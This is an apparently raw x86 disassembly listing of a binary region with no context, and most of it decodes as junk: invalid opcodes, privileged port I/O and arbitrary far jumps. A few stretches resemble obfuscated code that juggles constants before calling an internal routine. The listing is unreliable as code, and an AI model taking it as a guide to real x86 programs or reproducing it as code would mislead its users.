  419aec:	jmp    0x2404:0x20b174cd
  419af3:	retf   0x2d97
  419af6:	call   0x5e64ee9a
  419afb:	and    eax,0x2e7c1932
  419b00:	jae    0x419b7a
  419b02:	mov    esp,0x25271f20
  419b07:	inc    edi
  419b08:	aaa    
  419b09:	cdq    
  419b0a:	lods   eax,DWORD PTR ds:[esi]
  419b0b:	imul   edx,DWORD PTR [edx],0x69
  419b0e:	jne    0x419ab1
  419b10:	and    ebp,0xa853bec1
  419b16:	fwait
  419b17:	outs   dx,DWORD PTR ds:[esi]
  419b18:	pop    ebx
  419b19:	mov    eax,ds:0x34c1fdc0
  419b1e:	(bad)  
  419b1f:	test   eax,0xe7d02b59
  419b24:	js     0x419b40
  419b26:	sbb    ch,BYTE PTR [eax]
  419b28:	adc    ecx,DWORD PTR [ebp+0x64]
  419b2b:	or     eax,0xd625ea23
  419b30:	or     esi,edx
  419b32:	sub    DWORD PTR [ebp+0x48],esi
  419b35:	add    eax,0xecb4dcc1
  419b3a:	or     al,0xa8
  419b3c:	inc    eax
  419b3d:	xchg   DWORD PTR [ebx],ebp
  419b3f:	shr    DWORD PTR [esi],0x86
  419b42:	add    eax,0xcaf66297
  419b47:	add    BYTE PTR [edx-0x2720909f],bl
  419b4d:	enter  0xe74,0x4b
  419b51:	scas   eax,DWORD PTR es:[edi]
  419b52:	pop    ds
  419b53:	inc    esp
  419b54:	or     al,0xd1
  419b56:	popf   
  419b57:	xor    dh,BYTE PTR [ebp+0x41ae3e5]
  419b5d:	and    dh,BYTE PTR [ecx-0x5e]
  419b60:	push   ss
  419b61:	cmp    al,0xdb
  419b63:	push   esp
  419b64:	jle    0x419b8f
  419b66:	pop    ds
  419b67:	dec    edx
  419b68:	jge    0x419b7d
  419b6a:	or     al,0xea
  419b6c:	loope  0x419b40
  419b6e:	in     eax,0x7
  419b70:	out    0x87,eax
  419b72:	fnstcw WORD PTR [esi]
  419b74:	je     0x419b0c
  419b76:	mov    ebx,0x57b90048
  419b7b:	push   0x3af6552a
  419b80:	push   esi
  419b81:	add    al,0x5c
  419b83:	push   ebp
  419b84:	cmp    al,0x2e
  419b86:	mov    ah,0x6e
  419b88:	push   0xffffffa1
  419b8a:	stc    
  419b8b:	repz adc al,0x43
  419b8e:	xor    eax,DWORD PTR [esi-0x4c0f8c90]
  419b94:	add    BYTE PTR [edi+edi*4],0x54
  419b98:	mov    ?,WORD PTR [esi]
  419b9a:	out    dx,al
  419b9b:	lahf   
  419b9c:	xor    dh,bl
  419b9e:	and    ecx,edi
  419ba0:	and    BYTE PTR [ecx-0x59983709],dh
  419ba6:	pcmpgtd mm1,mm0
  419ba9:	and    eax,0x94a055db
  419bae:	cmp    al,0x65
  419bb0:	mov    eax,0x8449f8d1
  419bb5:	add    DWORD PTR [edx-0x77],edi
  419bb8:	test   eax,0x350e67ad
  419bbd:	lock into 
  419bbf:	add    eax,0xbba553f3
  419bc4:	popf   
  419bc5:	outs   dx,DWORD PTR ds:[esi]
  419bc6:	mov    edx,0xfbe580b5
  419bcb:	jp     0x419c24
  419bcd:	lahf   
  419bce:	in     eax,dx
  419bcf:	imul   ebx,DWORD PTR [ebp-0x7e],0xffffffa6
  419bd3:	int3   
  419bd4:	xor    eax,DWORD PTR [ebp-0x2d]
  419bd7:	div    DWORD PTR [edi-0x3bf89d98]
  419bdd:	xor    DWORD PTR [ecx+0x36258843],ecx
  419be3:	loopne 0x419bc8
  419be5:	add    DWORD PTR [ebx+0x5e],ecx
  419be8:	ss pop esi
  419bea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419beb:	mov    cl,0xca
  419bed:	sbb    eax,0xdc37a6e6
  419bf2:	push   ss
  419bf3:	mov    cl,0x16
  419bf5:	xor    ebp,ebp
  419bf7:	xchg   BYTE PTR [ebx+ecx*2-0x19],dl
  419bfb:	pop    di
  419bfd:	repz ds mov ebp,esi
  419c01:	outs   dx,BYTE PTR ds:[esi]
  419c02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c03:	cmp    bl,BYTE PTR [esi]
  419c05:	push   edi
  419c06:	jo     0x419c0e
  419c08:	rol    BYTE PTR [edx+0x28],0xe2
  419c0c:	dec    esi
  419c0d:	jnp    0x419c24
  419c0f:	repnz cmp BYTE PTR [ebp-0x31],al
  419c13:	mov    ah,dh
  419c15:	test   BYTE PTR [edx],dh
  419c17:	push   ecx
  419c18:	xor    eax,0xc5d13f5
  419c1d:	dec    ecx
  419c1e:	cld    
  419c1f:	inc    ecx
  419c20:	inc    eax
  419c21:	add    eax,0xa9df0f33
  419c26:	xchg   DWORD PTR [ecx+0x56b7121e],ebp
  419c2c:	push   0xffffffd3
  419c2e:	cmc    
  419c2f:	ins    BYTE PTR es:[edi],dx
  419c30:	div    BYTE PTR [edx]
  419c32:	cmc    
  419c33:	dec    edx
  419c34:	jp     0x419c4d
  419c36:	and    DWORD PTR [esi],ebx
  419c38:	sub    dl,0x3
  419c3b:	lods   al,BYTE PTR ds:[esi]
  419c3c:	lahf   
  419c3d:	test   DWORD PTR [edx],eax
  419c3f:	ins    BYTE PTR es:[edi],dx
  419c40:	cmp    al,0x59
  419c42:	fwait
  419c43:	or     edx,ecx
  419c45:	lods   al,BYTE PTR ds:[esi]
  419c46:	push   eax
  419c47:	(bad)  
  419c48:	cld    
  419c49:	add    al,0xb1
  419c4b:	sti    
  419c4c:	dec    DWORD PTR [ebp+0x73]
  419c4f:	sub    DWORD PTR [edx],0x3b
  419c52:	jns    0x419c03
  419c54:	and    edx,DWORD PTR [ebp-0x3a457050]
  419c5a:	add    eax,0x22156325
  419c5f:	adc    DWORD PTR [eax],ebx
  419c61:	clc    
  419c62:	pop    ebp
  419c63:	shr    DWORD PTR [eax-0x10751de6],0x91
  419c6a:	xchg   edi,eax
  419c6b:	bound  edi,QWORD PTR [esi]
  419c6d:	xchg   edx,eax
  419c6e:	aad    0x80
  419c70:	dec    edx
  419c71:	(bad)
  419c74:	dec    edx
  419c75:	(bad)
  419c78:	clc    
  419c79:	cmp    cl,BYTE PTR [eax]
  419c7b:	mov    edx,DWORD PTR [eax-0x45]
  419c7e:	sbb    bh,BYTE PTR [eax]
  419c80:	cmp    BYTE PTR [eax+0x4d0a158],bh
  419c86:	sub    dl,BYTE PTR [ebp+0x69]
  419c89:	sub    BYTE PTR [edi],bl
  419c8b:	cmc    
  419c8c:	jo     0x419c7d
  419c8e:	cmp    eax,0x76af95aa
  419c93:	jl     0x419c9a
  419c95:	mov    ebx,0xd3c2fc7f
  419c9a:	sbb    DWORD PTR [esi],esp
  419c9c:	push   0x1c
  419c9e:	mov    ss,esp
  419ca0:	das    
  419ca1:	scas   al,BYTE PTR es:[edi]
  419ca2:	jno    0x419c98
  419ca4:	push   edx
  419ca5:	adc    BYTE PTR [esi+ebp*1-0x27],ah
  419ca9:	push   esp
  419caa:	xchg   ebp,eax
  419cab:	pop    esi
  419cac:	(bad)  
  419cad:	clc    
  419cae:	loop   0x419c78
  419cb0:	push   cs
  419cb1:	mov    eax,ds:0x3fc030fb
  419cb6:	xchg   BYTE PTR [ebx+eiz*1],bh
  419cb9:	fs (bad) 
  419cbb:	push   ecx
  419cbc:	test   eax,0x831a6e5a
  419cc1:	xlat   BYTE PTR ds:[ebx]
  419cc2:	adc    bl,BYTE PTR [ecx-0x35]
  419cc5:	lea    edx,[ecx+eiz*1]
  419cc8:	inc    edi
  419cc9:	jns    0x419d3a
  419ccb:	mov    dl,0x95
  419ccd:	adc    dh,ch
  419ccf:	adc    eax,0x91a4aa
  419cd4:	ins    BYTE PTR es:[edi],dx
  419cd5:	shl    BYTE PTR [esi-0x38],1
  419cd8:	xchg   ecx,eax
  419cd9:	imul   BYTE PTR [ebx+0x82bee87]
  419cdf:	mov    ds:0xb6d044c7,al
  419ce4:	in     al,dx
  419ce5:	push   es
  419ce6:	dec    esi
  419ce7:	mov    edx,0xeb9c1282
  419cec:	in     al,0x95
  419cee:	adc    ecx,DWORD PTR es:[edx]
  419cf1:	popf   
  419cf2:	inc    ebp
  419cf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419cf4:	push   esp
  419cf5:	je     0x419cdd
  419cf7:	jns    0x419d03
  419cf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419cfa:	mov    eax,0x55ee4c43
  419cff:	mov    ecx,0x68b4def2
  419d04:	(bad)  
  419d05:	pop    ss
  419d06:	scas   al,BYTE PTR es:[edi]
  419d07:	adc    ch,BYTE PTR [ecx]
  419d09:	sbb    edi,eax
  419d0b:	(bad)  
  419d0c:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d0e:	lahf   
  419d0f:	jae    0x419ca2
  419d11:	cmp    edx,DWORD PTR [edi+ecx*4+0x52a16538]
  419d18:	mov    edx,0x1c279735
  419d1d:	icebp  
  419d1e:	das    
  419d1f:	sbb    cl,BYTE PTR [ecx+ecx*4+0x83d26c1]
  419d26:	inc    edi
  419d27:	out    dx,eax
  419d28:	popf   
  419d29:	dec    esp
  419d2a:	adc    BYTE PTR [ebx+0x3f59c540],ch
  419d30:	sbb    BYTE PTR cs:[esi-0x30c83033],0xda
  419d38:	ja     0x419ce2
  419d3a:	test   al,0xbf
  419d3c:	in     eax,0xd
  419d3e:	push   ebx
  419d3f:	out    0x6e,eax
  419d41:	ins    BYTE PTR es:[edi],dx
  419d42:	ror    BYTE PTR [ecx],cl
  419d44:	cmp    eax,0x281cdafa
  419d49:	ins    BYTE PTR es:[edi],dx
  419d4a:	das    
  419d4b:	pop    ebx
  419d4c:	pop    ecx
  419d4d:	jo     0x419cfe
  419d4f:	pop    esp
  419d50:	hlt    
  419d51:	je     0x419d1f
  419d53:	mov    bl,dh
  419d55:	test   eax,0x332274ea
  419d5a:	pop    ss
  419d5b:	cld    
  419d5c:	cmp    bl,BYTE PTR [edi+0x2a]
  419d5f:	sub    al,0x40
  419d61:	add    dh,BYTE PTR [ebx]
  419d63:	or     esp,DWORD PTR [edx-0x6b]
  419d66:	mov    edx,0x3328d680
  419d6b:	sbb    esi,ecx
  419d6d:	push   es
  419d6e:	mov    al,0x5b
  419d70:	fld    QWORD PTR [ecx+0x173b1100]
  419d76:	mov    edi,0x3bf054b5
  419d7b:	jg     0x419dbf
  419d7d:	int    0x51
  419d7f:	mov    dl,0x25
  419d81:	cld    
  419d82:	je     0x419d76
  419d84:	pop    ss
  419d85:	shl    DWORD PTR [edi-0x374a05d7],0xa9
  419d8c:	xlat   BYTE PTR ds:[ebx]
  419d8d:	ror    dh,1
  419d8f:	icebp  
  419d90:	or     DWORD PTR [esi],eax
  419d92:	push   DWORD PTR [eax-0x3eeaa35c]
  419d98:	ins    BYTE PTR es:[edi],dx
  419d99:	in     al,0xa0
  419d9b:	or     bl,bl
  419d9d:	ja     0x419d48
  419d9f:	cmp    al,0xf4
  419da1:	pop    ds
  419da2:	addr16 jo 0x419d3f
  419da5:	or     BYTE PTR [ebx+ecx*8],al
  419da8:	or     eax,0x842a1074
  419dad:	rol    ah,cl
  419daf:	sub    eax,0x9058e9ef
  419db4:	sbb    eax,0x70659284
  419db9:	pop    es
  419dba:	jne    0x419d3d
  419dbc:	sar    DWORD PTR [ecx+esi*2-0x48],0x29
  419dc1:	dec    ecx
  419dc2:	std    
  419dc3:	out    dx,eax
  419dc4:	adc    al,0xa4
  419dc6:	mov    eax,ds:0x6f90ccd4
  419dcb:	stc    
  419dcc:	sbb    DWORD PTR [esi-0x61],0xffffffdd
  419dd0:	add    DWORD PTR [edi-0x7b],ebx
  419dd3:	mov    edx,DWORD PTR [edi+0x718f6045]
  419dd9:	ins    BYTE PTR es:[edi],dx
  419dda:	clc    
  419ddb:	mov    DWORD PTR [edx+0x1459658c],esi
  419de1:	cmp    esi,DWORD PTR [edi+edi*1]
  419de4:	xchg   esp,eax
  419de5:	lea    esp,[ebp-0x11]
  419de8:	lahf   
  419de9:	cs dec ebx
  419deb:	or     al,al
  419ded:	rol    BYTE PTR [ebx],1
  419def:	pop    ss
  419df0:	add    eax,DWORD PTR ds:0xbca97979
  419df6:	stos   BYTE PTR es:[edi],al
  419df7:	inc    ebx
  419df8:	enter  0x5f81,0x18
  419dfc:	rol    DWORD PTR [ebx-0x6f3278fd],cl
  419e02:	pop    es
  419e03:	and    bl,BYTE PTR [ebx]
  419e05:	mov    BYTE PTR [edx-0x4e74e62b],dl
  419e0b:	sub    al,0x38
  419e0d:	push   0x53
  419e0f:	sbb    ebp,edi
  419e11:	jne    0x419e78
  419e13:	dec    ebp
  419e14:	sti    
  419e15:	jl     0x419de6
  419e17:	sbb    BYTE PTR [eax-0x30],bl
  419e1a:	lahf   
  419e1b:	arpl   WORD PTR [ebp+0x1a],ax
  419e1e:	sar    DWORD PTR [edi],cl
  419e20:	xchg   ebp,eax
  419e21:	dec    ebp
  419e22:	outs   dx,DWORD PTR ds:[esi]
  419e23:	stos   DWORD PTR es:[edi],eax
  419e24:	aaa    
  419e25:	mov    edi,0xc21f0eae
  419e2a:	and    al,0x2
  419e2c:	xor    BYTE PTR [ebp-0x3],dl
  419e2f:	pop    esi
  419e30:	mov    ch,0x11
  419e32:	(bad)  
  419e33:	ret    
  419e34:	das    
  419e35:	mov    edi,0x14244c8b
  419e3a:	mov    edx,DWORD PTR [esp+0x30]
  419e3e:	mov    ebx,DWORD PTR [esp+0x34]
  419e42:	add    eax,0xffffd1a5
  419e47:	adc    ecx,0xffffedf0
  419e4d:	xor    eax,edx
  419e4f:	xor    ecx,ebx
  419e51:	jmp    0x41a220
  419e56:	pop    eax
  419e58:	es push esp
  419e5a:	sub    bl,BYTE PTR es:[ebx-0x46]
  419e5e:	pusha  
  419e5f:	in     eax,0xd3
  419e61:	mov    esp,0xaa12e04e
  419e66:	xchg   BYTE PTR [ebp+0x12bc1816],dh
  419e6c:	sbb    BYTE PTR [eax],bl
  419e6e:	test   eax,0xa429083e
  419e73:	imul   ebp,DWORD PTR [esi+edi*4],0xffffff85
  419e77:	or     al,0x93
  419e79:	or     edi,esp
  419e7b:	imul   edi,DWORD PTR [edx],0xf59e852e
  419e81:	sbb    BYTE PTR [ecx-0x22e87d9c],bl
  419e87:	cwde   
  419e88:	jmp    0x6d906aed
  419e8d:	and    eax,esp
  419e8f:	mov    ebx,gs
  419e91:	retf   
  419e92:	mov    ah,0x7
  419e94:	shr    BYTE PTR [eax+0x269b94e0],0x47
  419e9b:	and    DWORD PTR [edx-0x64],eax
  419e9e:	scas   eax,DWORD PTR es:[edi]
  419e9f:	mov    cl,0xa8
  419ea1:	leave  
  419ea2:	pop    ss
  419ea3:	adc    BYTE PTR [edx-0xd412336],0xc6
  419eaa:	sbb    eax,0x1dd9fe7c
  419eaf:	rcr    ebx,0xe
  419eb2:	sahf   
  419eb3:	iret   
  419eb4:	retf   0xb416
  419eb7:	jno    0x419e70
  419eb9:	sbb    BYTE PTR [edx-0x5d],bh
  419ebc:	push   0xa31986a6
  419ec1:	push   es
  419ec2:	mov    cl,0xac
  419ec4:	fwait
  419ec5:	stos   BYTE PTR es:[edi],al
  419ec6:	dec    edi
  419ec7:	dec    ebx
  419ec8:	es popf 
  419eca:	adc    BYTE PTR ds:0x1aa76e92,dl
  419ed1:	fs xchg ebp,eax
  419ed3:	cld    
  419ed4:	sub    DWORD PTR [ebx-0x7b],0xffffffb3
  419ed8:	cmp    DWORD PTR [esi],ebp
  419eda:	retf   
  419edb:	and    ch,BYTE PTR [edi]
  419edd:	push   edx
  419ede:	pop    ebp
  419edf:	sti    
  419ee0:	xacquire xchg BYTE PTR [esi-0x7b],bh
  419ee4:	iret   
  419ee5:	ds sbb ebp,0x91d95dae
  419eec:	jmp    0x419ef2
  419eee:	ja     0x419f6e
  419ef0:	adc    eax,DWORD PTR [eax]
  419ef2:	pop    esi
  419ef3:	add    al,0xaa
  419ef5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ef6:	sbb    eax,DWORD PTR ds:0x5c37066d
  419efc:	fs dec edi
  419efe:	xor    eax,DWORD PTR [edi]
  419f00:	stc    
  419f01:	xor    DWORD PTR [ebx],esp
  419f03:	cmp    eax,0x395fff02
  419f08:	and    cl,BYTE PTR [esi+0x5d]
  419f0b:	ret    
  419f0c:	cdq    
  419f0d:	dec    edi
  419f0e:	repnz add eax,0x91bc245b
  419f14:	std    
  419f15:	pop    edi
  419f16:	fs cmp al,0x9c
  419f19:	cmc    
  419f1a:	xchg   ebx,eax
  419f1b:	lock push ecx
  419f1d:	pop    esi
  419f1e:	fcmovnbe st,st(1)
  419f20:	jmp    0x5d55:0xdb6e7096
  419f27:	mov    bl,0x19
  419f29:	xchg   esp,eax
  419f2a:	dec    ebx
  419f2b:	js     0x419f89
  419f2d:	push   ecx
  419f2e:	cmp    BYTE PTR [edx+0x4598565a],0x45
  419f35:	repnz cmp BYTE PTR [edi-0x61f49061],ch
  419f3c:	js     0x419fb5
  419f3e:	and    edi,eax
  419f40:	sub    bh,0xd6
  419f43:	pushf  
  419f44:	(bad)  
  419f45:	jmp    0xd094d6af
  419f4a:	je     0x419f7d
  419f4c:	jecxz  0x419f66
  419f4e:	ret    0x5064
  419f51:	dec    ebx
  419f52:	mov    eax,ds:0x69d2236d
  419f57:	push   eax
  419f58:	ror    DWORD PTR [ecx+0x3b],cl
  419f5b:	xchg   edi,eax
  419f5c:	inc    esp
  419f5d:	not    DWORD PTR [eax+0x5c]
  419f60:	inc    ecx
  419f61:	or     ebx,ebx
  419f63:	cmp    BYTE PTR [edi-0x28],0x7f
  419f67:	bound  ebx,QWORD PTR [eax-0x2677429f]
  419f6d:	fmul   st,st(0)
  419f6f:	push   0xe3e692c1
  419f74:	fstp   QWORD PTR [ecx]
  419f76:	jecxz  0x419f5b
  419f78:	gs cli 
  419f7a:	xor    DWORD PTR [ebp+0x2d],ecx
  419f7d:	or     ah,BYTE PTR fs:[edi-0x21]
  419f81:	mov    ebp,0x4a004334
  419f86:	retf   0x49e2
  419f89:	in     al,dx
  419f8a:	add    al,0xa3
  419f8c:	inc    eax
  419f8d:	push   edx
  419f8e:	sub    cl,BYTE PTR [eax-0x40]
  419f91:	mov    ecx,0xa6d5b301
  419f96:	xor    eax,DWORD PTR [esi]
  419f98:	scas   eax,DWORD PTR es:[edi]
  419f99:	leave  
  419f9a:	iret   
  419f9b:	aam    0xd6
  419f9d:	mov    cl,0xb8
  419f9f:	jae    0x419f59
  419fa1:	inc    ebp
  419fa2:	clc    
  419fa3:	or     DWORD PTR [ecx-0x61],edi
  419fa6:	xchg   DWORD PTR [esi+0x762ea412],ecx
  419fac:	inc    ebx
  419fad:	sub    edi,DWORD PTR ds:0x3e192697
  419fb3:	xor    al,BYTE PTR [esi+eax*1-0x29]
  419fb7:	mov    esi,0xc97ccad1
  419fbc:	and    edx,esi
  419fbe:	test   ebx,ebp
  419fc0:	dec    edx
  419fc1:	lods   eax,DWORD PTR ds:[esi]
  419fc2:	outs   dx,DWORD PTR ds:[esi]
  419fc3:	pop    ds
  419fc4:	fimul  WORD PTR [eax-0x6b8f185]
  419fca:	ds push ss
  419fcc:	sub    eax,0x15872c7f
  419fd1:	pop    ss
  419fd2:	add    eax,DWORD PTR [edi-0x7d331a70]
  419fd8:	and    cl,al
  419fda:	or     eax,0x8ffcc42e
  419fdf:	cwde   
  419fe0:	leave  
  419fe1:	mov    edi,0x3e92b767
  419fe6:	push   0x3e
  419fe8:	daa    
  419fe9:	enter  0x5eb4,0x71
  419fed:	sti    
  419fee:	push   cs
  419fef:	pop    ecx
  419ff0:	fs sub esi,ebx
  419ff3:	xchg   BYTE PTR [ebx],ah
  419ff5:	inc    DWORD PTR [eax-0x5a35851e]
  419ffb:	shr    BYTE PTR [ecx-0xba4911b],cl
  41a001:	ja     0x419fbc
  41a003:	adc    al,0xce
  41a005:	dec    edi
  41a006:	xchg   ebp,eax
  41a007:	add    al,0xf3
  41a009:	test   DWORD PTR [ebx+0xa1a246f],0x459eab9a
  41a013:	mov    bl,0x7f
  41a015:	mov    DWORD PTR [eax+0x1a],0xadae98f
  41a01c:	inc    esp
  41a01d:	push   ebx
  41a01e:	mov    ds:0x9f919d7,eax
  41a023:	test   eax,0xe7806491
  41a028:	pop    eax
  41a029:	dec    eax
  41a02a:	jecxz  0x419fda
  41a02c:	jnp    0x41a050
  41a02e:	fcmovnu st,st(3)
  41a030:	lahf   
  41a031:	rcr    edx,0xca
  41a034:	test   al,0x4c
  41a036:	neg    BYTE PTR [eax]
  41a038:	clc    
  41a039:	(bad)  
  41a03a:	push   eax
  41a03b:	pop    esp
  41a03c:	je     0x41a093
  41a03e:	or     al,0xf4
  41a040:	scas   al,BYTE PTR es:[edi]
  41a041:	jo     0x41a095
  41a043:	jnp    0x419ff5
  41a045:	ds inc ebx
  41a047:	add    eax,0xa8b6c3c0
  41a04c:	fdiv   st(1),st
  41a04e:	and    BYTE PTR [ebp-0x53],0x6
  41a052:	inc    ebx
  41a053:	mov    dh,0xbd
  41a055:	or     ecx,DWORD PTR [esi+esi*8-0x2c]
  41a059:	push   ebp
  41a05a:	test   eax,0xfc4def52
  41a05f:	dec    esp
  41a060:	inc    ebp
  41a061:	inc    ebp
  41a062:	in     eax,dx
  41a063:	and    eax,0x2349ca76
  41a068:	cmp    BYTE PTR [eax+0x547c84],0xd5
  41a06f:	push   0xffffffdc
  41a071:	sbb    edi,DWORD PTR [eax+0x6b]
  41a074:	int    0xa2
  41a076:	xor    DWORD PTR [edi+esi*1-0x2d1c332c],ecx
  41a07d:	push   edx
  41a07e:	scas   al,BYTE PTR es:[edi]
  41a07f:	inc    edx
  41a080:	popa   
  41a081:	jmp    DWORD PTR [edi]
  41a083:	retf   
  41a084:	popa   
  41a085:	hlt    
  41a086:	ins    DWORD PTR es:[edi],dx
  41a087:	sub    BYTE PTR [ebp+ebp*1-0x62],ah
  41a08b:	mov    ds:0x83f3764c,al
  41a090:	adc    ch,BYTE PTR [di]
  41a093:	ret    0xda4c
  41a096:	cs test eax,0xe303983e
  41a09c:	gs stos DWORD PTR es:[edi],eax
  41a09e:	imul   DWORD PTR [esi-0x3a]
  41a0a1:	int3   
  41a0a2:	add    DWORD PTR [eax],ebx
  41a0a4:	lahf   
  41a0a5:	ds ret 
  41a0a7:	and    DWORD PTR ds:0x8be2e672,ecx
  41a0ad:	xor    ecx,DWORD PTR [edi-0x3281d8b5]
  41a0b3:	jl     0x41a0e8
  41a0b5:	imul   eax,esp,0x3abd23b3
  41a0bb:	mov    ebx,0x816e1312
  41a0c0:	or     DWORD PTR [ebx+0x43dd0e58],0xb6c6b0cc
  41a0ca:	adc    DWORD PTR ds:0xeff637e0,eax
  41a0d0:	or     BYTE PTR [edi+0x24],0x90
  41a0d4:	gs adc al,0x7
  41a0d7:	or     cl,dh
  41a0d9:	(bad)  
  41a0da:	cmc    
  41a0db:	test   eax,0x78c1d420
  41a0e0:	loopne 0x41a14a
  41a0e2:	xor    eax,0xa925d473
  41a0e7:	ins    DWORD PTR es:[edi],dx
  41a0e8:	jbe    0x41a10b
  41a0ea:	push   ebp
  41a0eb:	inc    esp
  41a0ec:	and    edx,DWORD PTR [esi+0x1435a859]
  41a0f2:	mov    bl,dl
  41a0f4:	mov    ah,0xf5
  41a0f6:	xchg   edi,eax
  41a0f7:	fadd   DWORD PTR [eax+0x679a4964]
  41a0fd:	loop   0x41a0cd
  41a0ff:	(bad)  
  41a100:	pop    ss
  41a101:	push   ds
  41a102:	xor    eax,0xb406e944
  41a107:	lods   al,BYTE PTR ds:[esi]
  41a108:	xchg   ecx,eax
  41a109:	loope  0x41a17b
  41a10b:	mov    ds:0xe9857cb,al
  41a110:	mov    esi,0x80387b72
  41a115:	pop    ds
  41a116:	cs mov ch,0xc1
  41a119:	add    al,al
  41a11b:	mov    cl,0x59
  41a11d:	jnp    0x41a15f
  41a11f:	jp     0x41a136
  41a121:	rcl    BYTE PTR [edi],1
  41a123:	pop    edi
  41a124:	mov    bh,0x3d
  41a126:	ds addr16 cmp bh,bh
  41a12a:	out    dx,al
  41a12b:	xor    BYTE PTR [eax+0x2c4b2341],al
  41a131:	int    0x2b
  41a133:	aam    0x7a
  41a135:	(bad)  
  41a137:	and    DWORD PTR [ebp+0x76d22c8c],ebp
  41a13d:	sub    ebp,DWORD PTR [esi]
  41a13f:	dec    edx
  41a140:	lods   al,BYTE PTR ds:[esi]
  41a141:	pusha  
  41a142:	ficomp WORD PTR [edx]
  41a144:	cwde   
  41a145:	jmp    0x41a151
  41a147:	mov    DWORD PTR [ebp+0x6f78d174],edi
  41a14d:	sbb    esp,esi
  41a14f:	rcl    ecx,1
  41a151:	ins    DWORD PTR es:[edi],dx
  41a152:	ret    0x48cf
  41a155:	mov    eax,0x8888ae6d
  41a15a:	jb     0x41a199
  41a15c:	sti    
  41a15d:	aam    0x97
  41a15f:	imul   ebp,ebp,0x510bcc3d
  41a165:	push   edi
  41a166:	adc    BYTE PTR [esi],al
  41a168:	rcr    DWORD PTR [edx+0x62],0x65
  41a16c:	aam    0xc6
  41a16e:	ficomp DWORD PTR [ecx]
  41a170:	inc    ebx
  41a171:	push   ecx
  41a172:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a173:	imul   esi,DWORD PTR [esi],0xf5c9d437
  41a179:	sbb    ah,0xfd
  41a17c:	sub    cl,dl
  41a17e:	aam    0xb4
  41a180:	sub    eax,0x2893ee9f
  41a185:	lds    edi,FWORD PTR [ecx+eiz*4+0x16]
  41a189:	icebp  
  41a18a:	xchg   edx,eax
  41a18b:	adc    eax,0x9e3006d9
  41a191:	fldcw  WORD PTR [edi+0x6c]
  41a194:	cwde   
  41a195:	mov    ecx,0x8bc5d7f6
  41a19a:	in     eax,0xa2
  41a19c:	jae    0x41a201
  41a19e:	add    bl,BYTE PTR [edx]
  41a1a0:	stos   BYTE PTR es:[edi],al
  41a1a1:	mov    BYTE PTR [ebx+0x20],ah
  41a1a4:	jae    0x41a210
  41a1a6:	pop    eax
  41a1a7:	scas   eax,DWORD PTR es:[edi]
  41a1a8:	out    dx,eax
  41a1a9:	call   0xe9dc:0xe725fec3
  41a1b0:	xchg   BYTE PTR [ebx+0x5566c893],bl
  41a1b6:	imul   ebp,DWORD PTR [esi-0x3141cd03],0x6c4ebc01
  41a1c0:	adc    al,0x5a
  41a1c2:	lock js 0x41a14b
  41a1c5:	mov    ecx,0x8b3448ac
  41a1ca:	pop    eax
  41a1cb:	pop    esp
  41a1cc:	cmp    ecx,esp
  41a1ce:	push   0x9a1d894c
  41a1d3:	int    0x7a
  41a1d5:	ja     0x41a1bb
  41a1d7:	call   0x91706904
  41a1dc:	rcr    dl,0x7f
  41a1df:	test   DWORD PTR [ebp-0x37935f09],ebp
  41a1e5:	jmp    0x9982:0x9f2a4ab
  41a1ec:	lods   al,BYTE PTR ds:[esi]
  41a1ed:	cmp    eax,0x1571e9c9
  41a1f2:	xor    BYTE PTR ds:0x1030aac6,0x91
  41a1f9:	les    esi,FWORD PTR [edi+0x33]
  41a1fc:	in     eax,dx
  41a1fd:	dec    ecx
  41a1fe:	add    DWORD PTR [edi],esp
  41a200:	ds loope 0x41a24d
  41a203:	test   eax,0xdfa53221
  41a208:	das    
  41a209:	pop    ebp
  41a20a:	enter  0x40d1,0x5a
  41a20e:	or     al,al
  41a210:	fs adc al,0x40
  41a213:	fwait
  41a214:	adc    al,0xc1
  41a216:	cmc    
  41a217:	and    cl,dl
  41a219:	mov    dl,0x5c
  41a21b:	inc    edx
  41a21c:	cmp    BYTE PTR [ecx],ah
  41a21e:	shl    DWORD PTR [edx+0x325d25],0x0
  41a225:	mov    DWORD PTR [esp+0x50],eax
  41a229:	and    ecx,0x3544
  41a22f:	mov    DWORD PTR [esp+0x54],ecx
  41a233:	mov    DWORD PTR [esp+0x48],0x1704
  41a23b:	mov    DWORD PTR [esp+0x4c],0x4a75
  41a243:	mov    DWORD PTR [esp+0x30],0x985
  41a24b:	mov    DWORD PTR [esp+0x34],0x341
  41a253:	mov    DWORD PTR [esp+0x10],0x5aa9
  41a25b:	mov    DWORD PTR [esp+0x14],0x221a
  41a263:	mov    eax,DWORD PTR [esp+0x10]
  41a267:	mov    ecx,DWORD PTR [esp+0x14]
  41a26b:	mov    edx,DWORD PTR [esp+0x30]
  41a26f:	mov    ebx,DWORD PTR [esp+0x34]
  41a273:	push   ebx
  41a274:	push   edx
  41a275:	or     ecx,0xc32
  41a27b:	or     eax,0x502a
  41a280:	push   ecx
  41a281:	push   eax
  41a282:	call   0x416c20
  41a287:	mov    ecx,DWORD PTR [esp+0x48]
  41a28b:	mov    ebx,DWORD PTR [esp+0x4c]
  41a28f:	jmp    0x41a65e
  41a294:	call   0x1a7c:0x2b8dec68
  41a29b:	es popf 
  41a29d:	retf   0x7e10
  41a2a0:	retf   0x41a4
  41a2a3:	mov    esi,0x1816ad2b
  41a2a8:	mov    esp,0xb9181812
  41a2ad:	xor    DWORD PTR [eax-0xf16470a],esi
  41a2b3:	outs   dx,BYTE PTR ds:[esi]
  41a2b4:	je     0x41a324
  41a2b6:	std    
  41a2b7:	aaa    
  41a2b8:	mov    ebx,0x25b8e72c
  41a2bd:	(bad)  
  41a2be:	jg     0x41a244
  41a2c0:	lods   eax,DWORD PTR ds:[esi]
  41a2c1:	jmp    0x41a2f9
  41a2c3:	sub    dh,al
  41a2c5:	std    
  41a2c6:	aad    0x25
  41a2c8:	test   DWORD PTR [edx-0x3a9be23c],esp
  41a2ce:	and    al,0x8d
  41a2d0:	sbb    eax,0x21529dff
  41a2d5:	push   es
  41a2d6:	(bad)  
  41a2d8:	xor    esp,DWORD PTR [edi-0x22]
  41a2db:	pop    es
  41a2dc:	mov    ecx,0x91c7da0c
